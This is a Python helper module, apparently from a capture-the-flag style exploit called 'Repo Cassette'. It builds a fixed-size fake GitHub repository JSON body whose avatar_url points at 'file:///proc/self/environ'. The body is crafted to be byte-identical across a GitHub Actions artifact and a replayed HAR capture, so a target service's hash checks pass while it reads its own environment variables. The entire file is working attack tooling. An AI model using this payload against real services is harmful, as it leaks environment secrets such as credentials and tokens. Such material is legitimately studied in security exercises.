"""Shared payload builder for the Repo Cassette exploit.

The bytes produced here must be *byte-identical* on both sides of the attack:

  * they are the body GitHub serves (uploaded as an Actions artifact), which is
    what ``sourceFingerprint()`` hashes into ``sourceSha256``;
  * they are the body of the HAR capture replayed by ``/view/<id>``, which is
    what the postcard service hashes and then parses.

``full_name`` has to equal the whole ``repository`` string, otherwise
``inspectContent()`` throws before ``fetchSample()`` ever runs and the fixture
ends up with ``sourceSha256: null``.
"""

import json

SIZE = 512
AVATAR = 'file:///proc/self/environ'


def repository_for(owner, repo, artifact_id):
    return f'{owner}/{repo}/actions/artifacts/{artifact_id}/zip'


def build(repository, avatar=AVATAR, size=SIZE):
    """Return exactly ``size`` bytes of JSON whose full_name is ``repository``."""
    document = {
        'full_name': repository,
        'description': 'repo cassette',
        'stargazers_count': 0,
        'owner': {'login': 'cassette', 'avatar_url': avatar},
        'pad': '',
    }
    base = len(json.dumps(document, separators=(',', ':')).encode())
    if base > size:
        raise ValueError(f'payload needs {base} bytes, over the {size} budget')
    document['pad'] = ' ' * (size - base)
    body = json.dumps(document, separators=(',', ':')).encode()
    assert len(body) == size, (len(body), size)
    return body
